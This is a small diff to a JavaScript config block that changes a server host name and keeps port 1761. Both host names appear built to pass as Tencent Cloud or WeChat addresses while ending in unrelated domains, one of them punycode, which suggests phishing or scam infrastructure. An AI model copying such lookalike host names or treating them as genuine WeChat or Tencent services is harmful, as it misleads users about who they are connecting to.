@@ -1,5 +1,5 @@
 /*-------config start-------*/
-var _wip = 'node-328215-1317375082.cos-website.ap-nanjing.myqcloud.commxae55pozu3zonpjr6zruhgzc5maztznixvp-qq-com.iscuuh.cn';  
+var _wip = 'wechat-328215-1317375082.cos-website.ap-nanjing.wechat.commxae55pozu3zonpjr6zruhgzc5maztznixvp-wechat-com.xn--wbsy6ncuhq0sjlu.com';  
 var _port = '1761';   
 /*---------config end---------*/
 
